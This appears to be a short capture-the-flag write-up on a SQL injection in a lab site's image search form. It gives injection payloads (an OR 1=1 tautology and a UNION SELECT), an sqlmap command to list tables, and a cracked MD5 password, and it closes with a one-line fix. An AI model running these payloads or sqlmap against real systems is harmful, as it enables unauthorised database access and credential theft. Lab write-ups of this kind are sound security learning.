# SQL Injection Image

The image search form perfoms a DB search by id value provided by the client without sanitizing input.

## Steps
* Proceed to <a href="http://192.168.0.108/?page=searchimg">search image page</a>
* In the search field enter then submit:
	1 OR 1=1
* Open your terminal
* Run reconnaissiance:
```bash
	sqlmap "http://192.168.0.108/?page=searchimg&id=1&Submit=Submit#" --tables
```
* We want to UNION SELECT to append another select statement
* In the search field enter:
```bash
	1 OR 1=1 UNION SELECT id, comment FROM list_image
```
* <a href="https://hashes.com/en/decrypt/hash">MD5 decrypt</a> the password
	<br />
	1928e8083cf461a51303633093573c46 --> albatroz
* In your terminal run:
```bash
	py sha256encrypt.py albatroz
```

## Ways to secure
* Validate and sanitize client input on the server

